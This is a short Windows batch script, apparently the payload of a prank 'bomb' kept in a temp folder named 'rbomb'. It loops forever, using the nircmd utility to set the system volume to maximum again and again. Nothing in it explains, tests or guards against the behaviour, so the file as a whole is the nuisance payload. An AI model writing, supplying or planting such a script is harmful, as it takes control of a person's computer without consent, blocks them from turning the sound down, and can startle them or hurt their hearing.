@echo off
cd %temp%\rbomb
:loop
nircmd.exe changesysvolume 100000
goto loop